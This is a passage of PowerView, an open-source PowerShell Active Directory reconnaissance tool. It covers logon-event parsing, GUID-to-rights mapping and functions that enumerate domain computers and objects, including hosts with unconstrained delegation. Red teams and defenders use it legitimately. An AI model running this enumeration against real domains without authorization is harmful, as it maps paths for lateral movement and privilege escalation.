LogonType                 = $Properties[8].Value\n                                LogonProcessName          = $Properties[9].Value\n                                AuthenticationPackageName = $Properties[10].Value\n                                WorkstationName           = $Properties[11].Value\n                                LogonGuid                 = $Properties[12].Value\n                                TransmittedServices       = $Properties[13].Value\n                                LmPackageName             = $Properties[14].Value\n                                KeyLength                 = $Properties[15].Value\n                                ProcessId                 = $Properties[16].Value\n                                ProcessName               = $Properties[17].Value\n                                IpAddress                 = $Properties[18].Value\n                                IpPort                    = $Properties[19].Value\n                                ImpersonationLevel        = $Properties[20].Value\n                                RestrictedAdminMode       = $Properties[21].Value\n                                TargetOutboundUserName    = $Properties[22].Value\n                                TargetOutboundDomainName  = $Properties[23].Value\n                                VirtualAccount            = $Properties[24].Value\n                                TargetLinkedLogonId       = $Properties[25].Value\n                                ElevatedToken             = $Properties[26].Value\n                            }\n                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')\n                            $Output\n                        }\n                    }\n\n                    # logon with explicit credential\n                    4648 {\n                        # skip computer logons, for now...\n                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\\.exe')) {\n                            $Output = New-Object PSObject -Property @{\n                                ComputerName              = $Computer\n                                TimeCreated       = $Event.TimeCreated\n                                EventId           = $Event.Id\n                                SubjectUserSid    = $Properties[0].Value.ToString()\n                                SubjectUserName   = $Properties[1].Value\n                                SubjectDomainName = $Properties[2].Value\n                                SubjectLogonId    = $Properties[3].Value\n                                LogonGuid         = $Properties[4].Value.ToString()\n                                TargetUserName    = $Properties[5].Value\n                                TargetDomainName  = $Properties[6].Value\n                                TargetLogonGuid   = $Properties[7].Value\n                                TargetServerName  = $Properties[8].Value\n                                TargetInfo        = $Properties[9].Value\n                                ProcessId         = $Properties[10].Value\n                                ProcessName       = $Properties[11].Value\n                                IpAddress         = $Properties[12].Value\n                                IpPort            = $Properties[13].Value\n                            }\n                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')\n                            $Output\n                        }\n                    }\n                    default {\n                        Write-Warning \"No handler exists for event ID: $($Event.Id)\"\n                    }\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainGUIDMap {\n<#\n.SYNOPSIS\n\nHelper to build a hash table of [GUID] -> resolved names for the current or specified Domain.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Get-Forest  \n\n.DESCRIPTION\n\nSearches the forest schema location (CN=Schema,CN=Configuration,DC=testlab,DC=local) for\nall objects with schemaIDGUID set and translates the GUIDs discovered to human-readable names.\nThen searches the extended rights location (CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)\nfor objects where objectClass=controlAccessRight, translating the GUIDs again.\n\nHeavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.OUTPUTS\n\nHashtable\n\nOuputs a hashtable containing a GUID -> Readable Name mapping.\n\n.LINK\n\nhttp://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType([Hashtable])]\n    [CmdletBinding()]\n    Param (\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}\n\n    $ForestArguments = @{}\n    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }\n\n    try {\n        $SchemaPath = (Get-Forest @ForestArguments).schema.name\n    }\n    catch {\n        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'\n    }\n    if (-not $SchemaPath) {\n        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'\n    }\n\n    $SearcherArguments = @{\n        'SearchBase' = $SchemaPath\n        'LDAPFilter' = '(schemaIDGUID=*)'\n    }\n    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n    $SchemaSearcher = Get-DomainSearcher @SearcherArguments\n\n    if ($SchemaSearcher) {\n        try {\n            $Results = $SchemaSearcher.FindAll()\n            $Results | Where-Object {$_} | ForEach-Object {\n                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]\n            }\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainGUIDMap] Error disposing of the Results object: $_\"\n                }\n            }\n            $SchemaSearcher.dispose()\n        }\n        catch {\n            Write-Verbose \"[Get-DomainGUIDMap] Error in building GUID map: $_\"\n        }\n    }\n\n    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')\n    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'\n    $RightsSearcher = Get-DomainSearcher @SearcherArguments\n\n    if ($RightsSearcher) {\n        try {\n            $Results = $RightsSearcher.FindAll()\n            $Results | Where-Object {$_} | ForEach-Object {\n                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]\n            }\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainGUIDMap] Error disposing of the Results object: $_\"\n                }\n            }\n            $RightsSearcher.dispose()\n        }\n        catch {\n            Write-Verbose \"[Get-DomainGUIDMap] Error in building GUID map: $_\"\n        }\n    }\n\n    $GUIDs\n}\n\n\nfunction Get-DomainComputer {\n<#\n.SYNOPSIS\n\nReturn all computers or specific computer objects in AD.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Convert-LDAPProperty  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for all objects\nmatching the criteria. To only return specific properties, use\n\"-Properties samaccountname,usnchanged,...\". By default, all computer objects for\nthe current domain are returned.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),\nor a dns host name (e.g. windows10.testlab.local). Wildcards accepted.\n\n.PARAMETER UACFilter\n\nDynamic parameter that accepts one or more values from $UACEnum, including\n\"NOT_X\" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.\n\n.PARAMETER Unconstrained\n\nSwitch. Return computer objects that have unconstrained delegation.\n\n.PARAMETER TrustedToAuth\n\nSwitch. Return computer objects that are trusted to authenticate for other principals.\n\n.PARAMETER Printers\n\nSwitch. Return only printers.\n\n.PARAMETER SPN\n\nReturn computers with a specific service principal name, wildcards accepted.\n\n.PARAMETER OperatingSystem\n\nReturn computers with a specific operating system, wildcards accepted.\n\n.PARAMETER ServicePack\n\nReturn computers with a specific service pack, wildcards accepted.\n\n.PARAMETER SiteName\n\nReturn computers in the specific AD Site name, wildcards accepted.\n\n.PARAMETER Ping\n\nSwitch. Ping each host to ensure it's up before enumerating.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Raw\n\nSwitch. Return raw results instead of translating the fields into a custom PSObject.\n\n.EXAMPLE\n\nGet-DomainComputer\n\nReturns the current computers in current domain.\n\n.EXAMPLE\n\nGet-DomainComputer -SPN mssql* -Domain testlab.local\n\nReturns all MS SQL servers in the testlab.local domain.\n\n.EXAMPLE\n\nGet-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname\n\nReturn the dns hostnames of servers trusted for delegation.\n\n.EXAMPLE\n\nGet-DomainComputer -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\" -Unconstrained\n\nSearch the specified OU for computeres that allow unconstrained delegation.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainComputer -Credential $Cred\n\n.OUTPUTS\n\nPowerView.Computer\n\nCustom PSObject with translated computer property fields.\n\nPowerView.Computer.Raw\n\nThe raw DirectoryServices.SearchResult object, if -Raw is enabled.\n#>\n\n    [OutputType('PowerView.Computer')]\n    [OutputType('PowerView.Computer.Raw')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('SamAccountName', 'Name', 'DNSHostName')]\n        [String[]]\n        $Identity,\n\n        [Switch]\n        $Unconstrained,\n\n        [Switch]\n        $TrustedToAuth,\n\n        [Switch]\n        $Printers,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ServicePrincipalName')]\n        [String]\n        $SPN,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $OperatingSystem,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ServicePack,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $SiteName,\n\n        [Switch]\n        $Ping,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    DynamicParam {\n        $UACValueNames = [Enum]::GetNames($UACEnum)\n        # add in the negations\n        $UACValueNames = $UACValueNames | ForEach-Object {$_; \"NOT_$_\"}\n        # create new dynamic parameter\n        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])\n    }\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $CompSearcher = Get-DomainSearcher @SearcherArguments\n    }\n\n    PROCESS {\n        #bind dynamic parameter to a friendly variable\n        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {\n            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters\n        }\n\n        if ($CompSearcher) {\n            $IdentityFilter = ''\n            $Filter = ''\n            $Identity | Where-Object {$_} | ForEach-Object {\n                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                if ($IdentityInstance -match '^S-1-') {\n                    $IdentityFilter += \"(objectsid=$IdentityInstance)\"\n                }\n                elseif ($IdentityInstance -match '^CN=') {\n                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                        #   and rebuild the domain searcher\n                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        Write-Verbose \"[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                        $SearcherArguments['Domain'] = $IdentityDomain\n                        $CompSearcher = Get-DomainSearcher @SearcherArguments\n                        if (-not $CompSearcher) {\n                            Write-Warning \"[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                        }\n                    }\n                }\n                elseif ($IdentityInstance.Contains('.')) {\n                    $IdentityFilter += \"(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))\"\n                }\n                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {\n                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''\n                    $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                }\n                else {\n                    $IdentityFilter += \"(name=$IdentityInstance)\"\n                }\n            }\n            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                $Filter += \"(|$IdentityFilter)\"\n            }\n\n            if ($PSBoundParameters['Unconstrained']) {\n                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'\n                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'\n            }\n            if ($PSBoundParameters['TrustedToAuth']) {\n                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'\n                $Filter += '(msds-allowedtodelegateto=*)'\n            }\n            if ($PSBoundParameters['Printers']) {\n                Write-Verbose '[Get-DomainComputer] Searching for printers'\n                $Filter += '(objectCategory=printQueue)'\n            }\n            if ($PSBoundParameters['SPN']) {\n                Write-Verbose \"[Get-DomainComputer] Searching for computers with SPN: $SPN\"\n                $Filter += \"(servicePrincipalName=$SPN)\"\n            }\n            if ($PSBoundParameters['OperatingSystem']) {\n                Write-Verbose \"[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem\"\n                $Filter += \"(operatingsystem=$OperatingSystem)\"\n            }\n            if ($PSBoundParameters['ServicePack']) {\n                Write-Verbose \"[Get-DomainComputer] Searching for computers with service pack: $ServicePack\"\n                $Filter += \"(operatingsystemservicepack=$ServicePack)\"\n            }\n            if ($PSBoundParameters['SiteName']) {\n                Write-Verbose \"[Get-DomainComputer] Searching for computers with site name: $SiteName\"\n                $Filter += \"(serverreferencebl=$SiteName)\"\n            }\n            if ($PSBoundParameters['LDAPFilter']) {\n                Write-Verbose \"[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter\"\n                $Filter += \"$LDAPFilter\"\n            }\n            # build the LDAP filter for the dynamic UAC filter value\n            $UACFilter | Where-Object {$_} | ForEach-Object {\n                if ($_ -match 'NOT_.*') {\n                    $UACField = $_.Substring(4)\n                    $UACValue = [Int]($UACEnum::$UACField)\n                    $Filter += \"(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))\"\n                }\n                else {\n                    $UACValue = [Int]($UACEnum::$_)\n                    $Filter += \"(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)\"\n                }\n            }\n\n            $CompSearcher.filter = \"(&(samAccountType=805306369)$Filter)\"\n            Write-Verbose \"[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)\"\n\n            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }\n            else { $Results = $CompSearcher.FindAll() }\n            $Results | Where-Object {$_} | ForEach-Object {\n                $Up = $True\n                if ($PSBoundParameters['Ping']) {\n                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname\n                }\n                if ($Up) {\n                    if ($PSBoundParameters['Raw']) {\n                        # return raw result objects\n                        $Computer = $_\n                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')\n                    }\n                    else {\n                        $Computer = Convert-LDAPProperty -Properties $_.Properties\n                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')\n                    }\n                    $Computer\n                }\n            }\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainComputer] Error disposing of the Results object: $_\"\n                }\n            }\n            $CompSearcher.dispose()\n        }\n    }\n}\n\n\nfunction Get-DomainObject {\n<#\n.SYNOPSIS\n\nReturn all (or specified) domain objects in AD.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  \n\n.DESCRIPTION\n\nBuilds a directory searcher object using Get-DomainSearcher, builds a custom\nLDAP filter based on targeting/filter parameters, and searches for all objects\nmatching the criteria. To only return specific properties, use\n\"-Properties samaccountname,usnchanged,...\". By default, all objects for\nthe current domain are returned.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\nWildcards accepted.\n\n.PARAMETER UACFilter\n\nDynamic parameter that accepts one or more values from $UACEnum, including\n\"NOT_X\" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Raw\n\nSwitch. Return raw results instead of translating the fields into a custom PSObject.\n\n.EXAMPLE\n\nGet-DomainObject -Domain testlab.local\n\nReturn all objects for the testlab.local domain\n\n.EXAMPLE\n\n'S-1-5-21-890171859-3433809279-3366196753-1003', 'CN=dfm,CN=Users,DC=testlab,DC=local','b6a9a2fb-bbd5-4f28-9a09-23213cea6693','dfm.a' | Get-DomainObject -Properties distinguishedname\n\ndistinguishedname\n-----------------\nCN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local\nCN=dfm,CN=Users,DC=testlab,DC=local\nOU=OU3,DC=testlab,DC=local\nCN=dfm (admin),CN=Users,DC=testlab,DC=local\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainObject -Credential $Cred -Identity 'windows1'\n\n.EXAMPLE\n\nGet-Domain | Select-Object -Expand name\ntestlab.local\n\n'testlab\\harmj0y','DEV\\Domain Admins' | Get-DomainObject -Verbose -Properties distinguishedname\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainUser] Extracted domain 'testlab.local' from 'testlab\\harmj0y'\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))\n\ndistinguishedname\n-----------------\nCN=harmj0y,CN=Users,DC=testlab,DC=local\nVERBOSE: [Get-DomainUser] Extracted domain 'dev.testlab.local' from 'DEV\\Domain Admins'\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=Domain Admins)))\nCN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local\n\n.OUTPUTS\n\nPowerView.ADObject\n\nCustom PSObject with translated AD object property fields.\n\nPowerView.ADObject.Raw\n\nThe raw DirectoryServices.SearchResult object, if -Raw is enabled.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [OutputType('PowerView.ADObject')]\n    [OutputType('PowerView.ADObject.Raw')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    DynamicParam {\n        $UACValueNames = [Enum]::GetNames($UACEnum)\n        # add in the negations\n        $UACValueNames = $UACValueNames | ForEach-Object {$_; \"NOT_$_\"}\n        # create new dynamic parameter\n        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])\n    }\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $ObjectSearcher = Get-DomainSearcher @SearcherArguments\n    }\n\n    PROCESS {\n        #bind dynamic parameter to a friendly variable\n        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {\n            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters\n        }\n        if ($ObjectSearcher) {\n            $IdentityFilter = ''\n            $Filter = ''\n            $Identity | Where-Object {$_} | ForEach-Object {\n                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                if ($IdentityInstance -match '^S-1-') {\n                    $IdentityFilter += \"(objectsid=$IdentityInstance)\"\n                }\n                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {\n                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                        #   and rebuild the domain searcher\n                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        Write-Verbose \"[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                        $SearcherArguments['Domain'] = $IdentityDomain\n                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments\n                        if (-not $ObjectSearcher) {\n                            Write-Warning \"[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                        }\n                    }\n                }\n                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {\n                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''\n                    $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                }\n                elseif ($IdentityInstance.Contains('\\')) {\n                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\\28', '(').Replace('\\29', ')') | Convert-ADName -OutputType Canonical\n                    if ($ConvertedIdentityInstance) {\n                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))\n                        $ObjectName = $IdentityInstance.Split('\\')[1]\n                        $IdentityFilter += \"(samAccountName=$ObjectName)\"\n                        $SearcherArguments['Domain'] = $ObjectDomain\n                        Write-Verbose \"[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'\"\n                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments\n                    }\n                }\n                elseif ($IdentityInstance.Contains('.')) {\n                    $IdentityFilter += \"(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))\"\n                }\n                else {\n                    $IdentityFilter += \"(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))\"\n                }\n            }\n            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                $Filter += \"(|$IdentityFilter)\"\n            }\n\n            if ($PSBoundParameters['LDAPFilter']) {\n                Write-Verbose \"[Get-DomainObject] Using additional LDAP filter: $LDAPFilter\"\n                $Filter += \"$LDAPFilter\"\n            }\n\n            # build the LDAP filter for the dynamic UAC filter value\n            $UACFilter | Where-Object {$_} | ForEach-Object {\n                if ($_ -match 'NOT_.*') {\n                    $UACField = $_.Substring(4)\n                    $UACValue = [Int]($UACEnum::$UACField)\n                    $Filter += 